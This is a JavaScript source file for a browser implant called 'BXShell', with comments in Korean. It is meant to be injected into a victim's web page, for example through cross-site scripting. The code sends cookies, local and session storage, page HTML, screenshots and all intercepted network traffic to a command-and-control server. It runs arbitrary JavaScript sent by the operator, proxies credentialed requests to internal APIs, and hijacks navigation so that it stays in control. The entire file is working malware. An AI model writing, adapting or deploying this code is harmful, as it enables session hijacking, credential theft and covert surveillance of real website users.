/* BXShell v0.2 — payload bootstrap (비컨 · 채널 · 콘솔 · 앵커 · 네트워크 훅 · 프록시) */
(function () {
  var C2 = "__C2__";
  if (window.__bx_boot) return;                    // 이중 주입 방지
  window.__bx_boot = true;

  var ID = sessionStorage.bx_id || (sessionStorage.bx_id = Math.random().toString(36).slice(2, 10));
  var BN = Math.random().toString(36).slice(2, 8);   // 페이지 인스턴스 부트 난수 (새로고침 판별)
  var inframe = window.top !== window.self;        // 앵커된 iframe 내부 인스턴스인가
  window.__bx = window.__bx || { id: ID, boot: Date.now(), vars: {}, c2: C2 };   // 콘솔 영속 컨텍스트

  function seen(cid) {                             // 이중 채널(SSE+폴링) 중복 제거
    try {
      var k = "bx_seen_" + cid;
      if (localStorage.getItem(k)) return true;
      localStorage.setItem(k, "1");
    } catch (e) {}
    return false;
  }
  function beacon(tag, obj) {
    try {
      navigator.sendBeacon(C2 + "/b/" + tag,
        JSON.stringify(Object.assign({ id: ID, url: location.href, inframe: inframe, bn: BN, t: Date.now() }, obj || {})));
    } catch (e) {
      (new Image()).src = C2 + "/b/" + tag + "?d=" + encodeURIComponent(JSON.stringify(obj || {}));
    }
  }
  function safe(v) {
    try {
      if (v === undefined) return "undefined";
      if (typeof v === "object") return JSON.stringify(v, null, 1).slice(0, 2000);
      return String(v).slice(0, 2000);
    } catch (e) { return "[unstringifiable]"; }
  }

  // ── 콘솔 실행기: 표현식 우선, 실패 시 문장 모드 (await 지원) ──
  function run(cid, code) {
    if (seen(cid)) return;
    beacon("ack", { cid: cid });                     // 수신확인 — 실수령 증명
    var AF = Object.getPrototypeOf(async function () {}).constructor;
    function show(v){ beacon("result", { cid: cid, code: code, out: safe(v) }); }
    (new AF("bx", "return (" + code + ")"))(window.__bx)
      .then(show)
      .catch(function (e) {
        if (e instanceof SyntaxError)
          (new AF("bx", code))(window.__bx).then(show)
            .catch(function (e2) { beacon("result", { cid: cid, code: code, err: String(e2).slice(0, 400) }); });
        else beacon("result", { cid: cid, code: code, err: String(e).slice(0, 400) });
      });
  }

  // ── v0.3: 피해자 실제 문서 해석 — anchor 모드에서 top은 껍데기, 실제 문서는 frames[0] ──
  function victimWin() {
    if (inframe) return window;
    try {
      var f = window.frames[0];
      if (f && f.frameElement && f.frameElement.id === "__bx_frame") return f;
    } catch (e) {}
    return window;                                  // hijack 모드 등 — 자기 문서
  }
  window.__bx.doc = function () { return victimWin().document; };

  // ── v0.3: bx.htmldump() — 피해자 문서 HTML을 청크 비컨으로 전송 ──
  window.__bx.htmldump = function () {
    var html = window.__bx.doc().documentElement.outerHTML;
    var CHUNK = 3500, total = Math.max(1, Math.ceil(html.length / CHUNK));
    for (var i = 0, n = 0; n < total; i += CHUNK, n++)
      beacon("html", { n: n, total: total, body: html.slice(i, i + CHUNK) });
    return { len: html.length, chunks: total };
  };

  // ── v0.3: bx.shot() — 피해자 문서 스크린샷 (html2canvas를 피해자 문서에 주입해 캡처) ──
  window.__bx.shot = function () {
    window.__bx_shotPending = false;                // 자동수집 중복 방지 플래그 해제
    var W = victimWin(), doc = W.document;
    var _cap = function () {
      try {
        W.html2canvas(doc.documentElement, {
          scale: 1, useCORS: false, allowTaint: false, logging: false, imageTimeout: 0,
          width: Math.min(W.innerWidth, 1920),
          height: Math.min(W.innerHeight, 1600)
        }).then(function (cv) {
          try {
            var b64 = cv.toDataURL("image/jpeg", 0.75).split(",")[1];
            if (!b64 || b64.length < 10) return;
            var SC = 6000, tot = Math.max(1, Math.ceil(b64.length / SC));
            for (var si = 0, sn = 0; sn < tot; si += SC, sn++)
              beacon("screenshot", { n: sn, total: tot, body: b64.slice(si, si + SC) });
          } catch (e2) {}
        }).catch(function () {});
      } catch (e) {}
    };
    if (typeof W.html2canvas === "function") { _cap(); return "capturing"; }
    var s = doc.createElement("script");            // 피해자 문서 컨텍스트에서 로드
    s.onload = _cap; s.onerror = function () {};
    s.src = "https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js";
    (doc.head || doc.body || doc.documentElement).appendChild(s);
    return "capturing";
  };

  // ── 비컨 ──
  beacon("info", { cookie: document.cookie, title: document.title, ua: navigator.userAgent,
                   ls: (JSON.stringify(localStorage) || "").slice(0, 1500) });

  // ── v0.3 자동 수집 — 첫 연결 1회, anchor document.open() 이전에 동기 처리 ──
  if (!inframe && !window.__bx_collected) {
    window.__bx_collected = true;
    try {
      // fetch() 대신 동기 XHR: anchor 모드 document.open()이 fetch를 취소하기 전에 완료
      var _cfgXhr = new XMLHttpRequest();
      _cfgXhr.open("GET", C2 + "/config", false);
      _cfgXhr.send();
      var _cfg = JSON.parse(_cfgXhr.responseText);

      if (_cfg.pageinfo) {
        var pi = {
          referrer: document.referrer,
          lang: navigator.language,
          platform: navigator.platform,
          screen: screen.width + "x" + screen.height,
          viewport: window.innerWidth + "x" + window.innerHeight,
          online: navigator.onLine,
          ss: "", meta: {}, forms: []
        };
        try { pi.ss = (JSON.stringify(sessionStorage) || "").slice(0, 1500); } catch(e) {}
        document.querySelectorAll("meta[name],meta[property]").forEach(function(m) {
          var k = m.getAttribute("name") || m.getAttribute("property");
          if (k) pi.meta[k] = (m.getAttribute("content") || "").slice(0, 200);
        });
        document.querySelectorAll("form").forEach(function(f) {
          var fields = [];
          f.querySelectorAll("input[name],select[name],textarea[name]").forEach(function(inp) {
            fields.push({ name: inp.name, type: inp.getAttribute("type") || "text", id: inp.id });
          });
          if (fields.length) pi.forms.push({ action: f.action, method: f.method, fields: fields });
        });
        beacon("pageinfo", pi);
      }

      if (_cfg.html) window.__bx.htmldump();          // 부트 시점 — pre-anchor라 실제 문서

      // 스크린샷은 앵커 전환 이후 피해자 문서 기준으로 캡처 (bx.shot이 플래그 해제)
      window.__bx_shotPending = !!_cfg.screenshot;
      setTimeout(function () {
        try { if (window.__bx_shotPending) window.__bx.shot(); } catch (e) {}
      }, 3000);
    } catch(e) {}
  }

  // ── 피해자 콘솔 캡처: console.* + 미처리 오류 → 운영자 콘솔로 ──
  ["log", "info", "warn", "error"].forEach(function (k) {
    var orig = console[k];
    console[k] = function () {
      try {
        beacon("console", { level: k,
                            text: [].slice.call(arguments).map(safe).join(" ").slice(0, 300) });
      } catch (e) {}
      try { orig && orig.apply(console, arguments); } catch (e) {}
    };
  });
  window.onerror = function (m, src, ln, col) {
    beacon("console", { level: "error", text: ("오류: " + m + " @" + (src || "") + ":" + ln).slice(0, 300) });
  };

  // ── 채널: SSE + 폴링 (cid 중복제거) — 최상위 프레임만 운용 ──
  if (!inframe) {
    var regInfo = function () {
      beacon("info", { cookie: document.cookie, title: document.title, ua: navigator.userAgent,
                       ls: (JSON.stringify(localStorage) || "").slice(0, 1500) });
    };
    try {
      var es = new EventSource(C2 + "/sse?id=" + ID);
      es.onopen = regInfo;                      // C2 재시작 후에도 세션 자동 재등록
      es.onmessage = function (ev) { try { var m = JSON.parse(ev.data); run(m.cid, m.code); } catch (e) {} };
    } catch (e) {}
    (function poll() {
      fetch(C2 + "/cmd?id=" + ID, { cache: "no-store" })
        .then(function (r) { return r.json(); })
        .then(function (arr) { (arr || []).forEach(function (m) { run(m.cid, m.code); }); })
        .catch(function () {});
      setTimeout(poll, 4000);
    })();
    (function beat() {                              // 하트비트: 15~25초 지터 (이중 실행 방지)
      setTimeout(function () { beacon("beat", {}); beat(); }, 15000 + Math.random() * 10000);
    })();

  }

  // ── v0.3: fetch 훅 — top + iframe 모두 설치 (anchor 모드: 실제 페이지 커버) ──
  var _F = window.fetch;
  window.fetch = function (input, opts) {
    var u = String(input instanceof Request ? input.url : input);
    if (u.indexOf(C2) !== -1) return _F.apply(this, arguments);
    var method = ((opts && opts.method) ||
                  (input instanceof Request && input.method) || "GET").toUpperCase();
    var reqBody = "", reqHeaders = "";
    try {
      if (opts && opts.body != null)
        reqBody = typeof opts.body === "string" ? opts.body
                : (typeof FormData !== "undefined" && opts.body instanceof FormData) ? "[FormData]"
                : String(opts.body);
      else if (input instanceof Request) reqBody = "[Request]";
    } catch (e) {}
    try {
      if (opts && opts.headers)
        reqHeaders = typeof opts.headers === "string" ? opts.headers
                   : JSON.stringify(opts.headers).slice(0, 500);
    } catch (e) {}
    var t0 = Date.now();
    var p = _F.apply(this, arguments);
    p.then(function (r) {
      r.clone().text().then(function (body) {
        beacon("net", {
          method: method, url: u, status: r.status, ms: Date.now() - t0,
          ct: r.headers.get("content-type") || "",
          size: Number(r.headers.get("content-length")) || body.length,
          body: body.slice(0, 8000),
          req_body: String(reqBody).slice(0, 4000), req_headers: reqHeaders
        });
      }).catch(function () {});
    }).catch(function (e) {
      beacon("net", {
        method: method, url: u, status: 0, ms: Date.now() - t0,
        err: String(e).slice(0, 200),
        req_body: String(reqBody).slice(0, 4000), req_headers: reqHeaders
      });
    });
    return p;
  };

  // ── v0.3: XHR 훅 ──
  var _XO = XMLHttpRequest.prototype.open;
  var _XS = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open = function (method, url) {
    this._bx_m = method; this._bx_u = String(url);
    return _XO.apply(this, arguments);
  };
  XMLHttpRequest.prototype.send = function (body) {
    if (this._bx_u && this._bx_u.indexOf(C2) === -1) {
      var t0 = Date.now(), m = this._bx_m, u = this._bx_u, self = this;
      var rbody = "";
      try { rbody = typeof body === "string" ? body
          : (body ? "[" + (body.constructor ? body.constructor.name : "object") + "]" : ""); } catch (e) {}
      this.addEventListener("loadend", function () {
        try {
          beacon("net", {
            method: m, url: u, status: self.status, ms: Date.now() - t0,
            ct: self.getResponseHeader("Content-Type") || "",
            size: (self.responseText || "").length,
            body: String(self.responseText || "").slice(0, 8000),
            req_body: String(rbody).slice(0, 4000)
          });
        } catch (e) {}
      }, { once: true });
    }
    return _XS.apply(this, arguments);
  };

  // ── v0.3: 리소스 로드 관찰 (img/script/css 메타데이터 — fetch/XHR initiator 제외) ──
  try {
    var _po = new PerformanceObserver(function (list) {
      (list.getEntries() || []).forEach(function (e) {
        if (!e.name || e.name.indexOf(C2) !== -1) return;
        var it = (e.initiatorType || "").toLowerCase();
        if (it === "fetch" || it === "xmlhttprequest" || it === "beacon") return;
        beacon("net", {
          method: (e.initiatorType || "GET").toUpperCase(), url: e.name,
          status: 0, ro: 1, size: e.transferSize || 0, ms: Math.round(e.duration) || 0
        });
      });
    });
    _po.observe({ type: "resource", buffered: true });
  } catch (e) {}

  // ── v0.3: WebSocket 래핑 (open/close + 프레임, 소켓당 각 10개 캡) ──
  try {
    var _WS = window.WebSocket;
    window.WebSocket = function (url, protos) {
      var ws = protos === undefined ? new _WS(url) : new _WS(url, protos);
      try {
        var u = String(url), nmsg = 0, nsend = 0;
        beacon("net", { method: "WS", url: u, status: 0, ws: 1 });
        ws.addEventListener("open",  function () { beacon("net", { method: "WS", url: u, status: 101, ws: 1 }); });
        ws.addEventListener("close", function () { beacon("net", { method: "WS", url: u, status: 0, ws: 1, body: "[closed]" }); });
        ws.addEventListener("message", function (ev) {
          if (++nmsg <= 10) beacon("net", { method: "WS◀", url: u, status: 0, ws: 1, body: String(ev.data).slice(0, 2000) });
        });
        var _wsend = ws.send.bind(ws);
        ws.send = function (d) {
          if (++nsend <= 10) beacon("net", { method: "WS▶", url: u, status: 0, ws: 1, body: String(d).slice(0, 2000) });
          return _wsend(d);
        };
      } catch (e) {}
      return ws;
    };
    window.WebSocket.prototype = _WS.prototype;
    ["CONNECTING", "OPEN", "CLOSING", "CLOSED"].forEach(function (k, i) { try { window.WebSocket[k] = i; } catch (e) {} });
  } catch (e) {}

  // ── v0.3: EventSource(SSE) 래핑 (open + 첫 5개 메시지) ──
  try {
    var _ES = window.EventSource;
    window.EventSource = function (url, cfg) {
      var es = cfg === undefined ? new _ES(url) : new _ES(url, cfg);
      try {
        var u = String(url), n = 0;
        beacon("net", { method: "SSE", url: u, status: 0, ws: 1 });
        es.addEventListener("message", function (ev) {
          if (++n <= 5) beacon("net", { method: "SSE◀", url: u, status: 0, ws: 1, body: String(ev.data).slice(0, 1000) });
        });
      } catch (e) {}
      return es;
    };
    window.EventSource.prototype = _ES.prototype;
  } catch (e) {}

  // ── v0.3: sendBeacon 래핑 (서드파티 비컨 관찰 — 자기 비컨 제외) ──
  try {
    var _SB = navigator.sendBeacon.bind(navigator);
    navigator.sendBeacon = function (u, d) {
      if (String(u).indexOf(C2) === -1)
        beacon("net", { method: "BEACON", url: String(u), status: 0, body: String(d || "").slice(0, 1000) });
      return _SB(u, d);
    };
  } catch (e) {}
  // ── v0.2: bx.proxy(url, opts) — 피해자 브라우저를 통해 내부 API 요청, 청크 비컨 ──
  //   사용: await bx.proxy('/admin/api/users')
  //         await bx.proxy('http://internal/', {method:'POST', body: JSON.stringify({x:1})})
  window.__bx.proxy = function (url, opts) {
    var rid = Math.random().toString(36).slice(2, 8);
    var _opts = Object.assign({ credentials: "include" }, opts || {});
    return fetch(url, _opts).then(function (r) {
      return r.text().then(function (body) {
        var CHUNK = 3500, total = Math.max(1, Math.ceil(body.length / CHUNK));
        for (var i = 0, n = 0; n < total; i += CHUNK, n++) {
          beacon("proxy", {
            rid: rid, url: url, status: r.status,
            n: n, total: total, body: body.slice(i, i + CHUNK)
          });
        }
        return { status: r.status, body: body };
      });
    });
  };

  // ── v0.2: bx.dom — DOM 조작 헬퍼 ──
  window.__bx.dom = {
    q:  function (sel) { return document.querySelector(sel); },
    qa: function (sel) { return Array.from(document.querySelectorAll(sel)); },
    text: function (sel) { var e = document.querySelector(sel); return e ? e.textContent.trim() : null; },
    html: function (sel) { var e = document.querySelector(sel); return e ? e.innerHTML : null; },
    click: function (sel) { var e = document.querySelector(sel); if(e) e.click(); return !!e; },
    val:  function (sel, v) {
      var e = document.querySelector(sel); if(!e) return null;
      if(v !== undefined){ e.value = v; e.dispatchEvent(new Event('input', {bubbles:true})); }
      return e.value;
    },
    submit: function (sel) {
      var f = document.querySelector(sel);
      if(!f) return false;
      f.dispatchEvent(new Event('submit', {bubbles:true, cancelable:true}));
      return true;
    }
  };

  // ── 지속성: 앵커(XFO 사전검사) → 폴백 하이재킹 — 최상위에서만 ──
  if (!inframe) {
    fetch(location.href, { credentials: "include" }).then(function (r) {
      var xfo = (r.headers.get("x-frame-options") || "").toLowerCase();
      if (xfo.indexOf("deny") >= 0) { beacon("mode", { mode: "hijack" }); hijack(); }
      else if (!window.__bx_anchored) {
        window.__bx_anchored = true;
        beacon("mode", { mode: "anchor" });
        document.open();
        document.write('<iframe id="__bx_frame" name="__bx_frame" src="' + location.href +
          '" style="position:fixed;inset:0;width:100%;height:100%;border:0"></iframe>');
        document.close();
        // 앵커 iframe 로드 완료 시점에 피해자 문서(iframe 내부) 스크린샷 — bx.shot이 중복 방지
        try {
          if (window.__bx_shotPending)
            window.frames[0].addEventListener("load",
              function(){ try { window.__bx.shot(); } catch (e) {} });
        } catch (e) {}
      }
    }).catch(function () {});
  }
  var hijacked = false;
  function hijack() {
    if (hijacked) return; hijacked = true;

    // 공통 소프트 내비게이션 — fetch로 페이지를 받아 DOM만 교체, bx 컨트롤러 생존
    function _softNav(url, method, body) {
      if (!url) return;
      try { url = new URL(url, location.href).href; } catch(e) { return; }
      if (url.indexOf("javascript:") === 0) return;
      var opts = { credentials: "include" };
      if (method === "POST") { opts.method = "POST"; opts.body = body; }
      fetch(url, opts).then(function(r){ return r.text(); }).then(function(html) {
        var doc = new DOMParser().parseFromString(html, "text/html");
        document.title = doc.title;
        document.body.innerHTML = doc.body.innerHTML;
        history.pushState({}, doc.title, url);
        beacon("info", { cookie: document.cookie, title: document.title,
                         ua: navigator.userAgent,
                         ls: (JSON.stringify(localStorage) || "").slice(0, 1500) });
      }).catch(function(){});
    }

    // 1. <a> 클릭
    document.addEventListener("click", function(e) {
      var a = e.target.closest && e.target.closest("a[href]");
      if (!a || a.target === "_blank") return;
      var href = a.getAttribute("href") || "";
      if (href.charAt(0) === "#" || href.indexOf("javascript:") === 0) return;
      e.preventDefault(); _softNav(a.href);
    }, true);

    // 2. form submit (GET + POST 모두)
    document.addEventListener("submit", function(e) {
      var f = e.target; if (!f || f.tagName !== "FORM") return;
      e.preventDefault();
      var method = (f.method || "GET").toUpperCase();
      var action = f.action || location.href;
      if (method === "POST") {
        _softNav(action, "POST", new FormData(f));
      } else {
        var qs = new URLSearchParams(new FormData(f)).toString();
        _softNav(action + (qs ? (action.indexOf("?") >= 0 ? "&" : "?") + qs : ""));
      }
    }, true);

    // 3. location.assign / location.replace 오버라이드
    try { Location.prototype.assign  = function(url){ _softNav(url); }; } catch(e){}
    try { Location.prototype.replace = function(url){ _softNav(url); }; } catch(e){}

    // 4. location.href = "..." setter 오버라이드
    try {
      var _lp = Location.prototype;
      var _ld = Object.getOwnPropertyDescriptor(_lp, "href");
      if (_ld && _ld.set) {
        Object.defineProperty(_lp, "href", {
          get: _ld.get,
          set: function(url){ _softNav(url); },
          configurable: true
        });
      }
    } catch(e){}

    // 5. history.pushState / replaceState 래핑 (React/Vue/Angular SPA 대응)
    var _hps = history.pushState.bind(history);
    var _hrs = history.replaceState.bind(history);
    history.pushState = function(s, t, url) {
      _hps(s, t, url);
      if (url) beacon("info", { cookie: document.cookie, title: document.title,
                                 ua: navigator.userAgent,
                                 ls: (JSON.stringify(localStorage)||"").slice(0,1500) });
    };
    history.replaceState = function(s, t, url) {
      _hrs(s, t, url);
      if (url) beacon("info", { cookie: document.cookie, title: document.title,
                                 ua: navigator.userAgent,
                                 ls: (JSON.stringify(localStorage)||"").slice(0,1500) });
    };

    // 6. popstate — 브라우저 뒤로/앞으로 버튼
    window.addEventListener("popstate", function() {
      fetch(location.href, { credentials: "include" }).then(function(r){ return r.text(); })
        .then(function(html) {
          var doc = new DOMParser().parseFromString(html, "text/html");
          document.title = doc.title;
          document.body.innerHTML = doc.body.innerHTML;
          beacon("info", { cookie: document.cookie, title: document.title,
                           ua: navigator.userAgent,
                           ls: (JSON.stringify(localStorage)||"").slice(0,1500) });
        }).catch(function(){});
    });

    // 7. meta http-equiv="refresh" 제거 + 신규 삽입 감시
    document.querySelectorAll('meta[http-equiv="refresh"],meta[http-equiv="Refresh"]')
      .forEach(function(m){ m.remove(); });
    new MutationObserver(function(muts) {
      muts.forEach(function(m) {
        m.addedNodes.forEach(function(n) {
          if (n.nodeName === "META" && (n.httpEquiv || "").toLowerCase() === "refresh") n.remove();
        });
      });
    }).observe(document.documentElement, { childList: true, subtree: true });

    // 8. beforeunload — 이탈 직전 마지막 비컨 (연결 재설정 힌트)
    window.addEventListener("beforeunload", function() {
      try { navigator.sendBeacon(C2 + "/b/beat",
        JSON.stringify({ id: ID, url: location.href, bn: BN, t: Date.now() })); } catch(e){}
    });
  }
})();
